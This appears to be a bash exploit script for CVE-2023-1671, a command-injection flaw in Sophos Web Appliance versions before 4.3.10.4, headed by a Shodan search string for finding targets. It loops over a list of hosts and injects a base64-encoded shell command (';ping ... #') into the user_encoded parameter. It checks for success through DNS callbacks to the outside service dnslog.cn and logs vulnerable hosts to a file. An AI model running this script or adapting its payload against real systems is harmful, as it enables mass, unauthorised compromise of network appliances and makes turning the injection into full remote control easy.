#!/bin/bash 
# Version:  Sophos Web Appliance older than version 4.3.10.4 are Vulnerable
# Version:  Sophos Web Appliance older than version 4.3.10.4 are Vulnerable
# CVE : CVE-2023-1671
# Shodan Dork: title:"Sophos Web Appliance"



TARGET_LIST="$1"

# =====================
BOLD="\033[1m"
RED="\e[1;31m"
GREEN="\e[1;32m"
YELLOW="\e[1;33m"
BLUE="\e[1;34m"
NOR="\e[0m"
# ====================


get_new_subdomain()
{
cat  MN.txt | grep 'YES' >/dev/null;ch=$?
           if [ $ch -eq 0 ];then
		echo -e "	[+] Trying to get Subdomain $NOR"
	   rm -rf cookie.txt
	  sub=`curl -i -c cookie.txt -s -k -X $'GET' \
          -H $'Host: www.dnslog.cn' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/112.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://www.dnslog.cn/' \
	    $'http://www.dnslog.cn/getdomain.php?t=0' | grep dnslog.cn` 
      	   echo -e "	[+]$BOLD$GREEN Subdomain : $sub $NOR"
  	   fi
}

check_vuln()
{
curl -k --trace-ascii % "https://$1/index.php?c=blocked&action=continue" -d "args_reason=filetypewarn&url=$RANDOM&filetype=$RANDOM&user=$RANDOM&user_encoded=$(echo -n "';ping $sub -c 3 #" | base64)"

req=`curl -i -s -k -b cookie.txt -X $'GET' \
    -H $'Host: www.dnslog.cn' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://www.dnslog.cn/' \
       $'http://www.dnslog.cn/getrecords.php?t=0'`
       
echo "$req"  | grep 'dnslog.cn' >/dev/null;ch=$?
           if [ $ch -eq 0 ];then
           	echo "YES" > MN.txt
		echo -e "	[+]$BOLD $RED https://$1 Vulnerable :D $NOR"
		echo "https://$1" >> vulnerable.lst			
	        else 
       		echo -e "	[-] https://$1 Not Vulnerable :| $NOR"
     		echo "NO" > MN.txt
	   fi
}

echo '

 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗        ██╗ ██████╗███████╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗      ███║██╔════╝╚════██║
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗╚██║███████╗    ██╔╝
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝ ██║██╔═══██╗  ██╔╝ 
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝       ██║╚██████╔╝  ██║  
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝        ╚═╝ ╚═════╝   ╚═╝  
                                                                                        
██████╗ ██╗   ██╗    ██████╗ ███████╗██╗  ██╗███╗   ██╗ █████╗ ███╗   ███╗       ██╗    
██╔══██╗╚██╗ ██╔╝    ██╔══██╗██╔════╝██║  ██║████╗  ██║██╔══██╗████╗ ████║    ██╗╚██╗   
██████╔╝ ╚████╔╝     ██████╔╝█████╗  ███████║██╔██╗ ██║███████║██╔████╔██║    ╚═╝ ██║   
██╔══██╗  ╚██╔╝      ██╔══██╗██╔══╝  ██╔══██║██║╚██╗██║██╔══██║██║╚██╔╝██║    ▄█╗ ██║   
██████╔╝   ██║       ██████╔╝███████╗██║  ██║██║ ╚████║██║  ██║██║ ╚═╝ ██║    ▀═╝██╔╝   
╚═════╝    ╚═╝       ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝       ╚═╝    
                                                                                       
                                                                                        '
if test "$#" -ne 1; then
    echo       "   ----------------------------------------------------------------"
    echo "    [!] please give the target list file : bash CVE-2023-1671.sh targets.txt "
    echo       "   ---------------------------------------------------------------"
    exit
fi



rm -rf cookie.txt
echo "YES" > MN.txt
for target in `cat $TARGET_LIST`
do

get_new_subdomain;
echo "	[~] Checking $target"
	check_vuln "$target"
done
rm -rf MN.txt
rm -rf cookie.txt

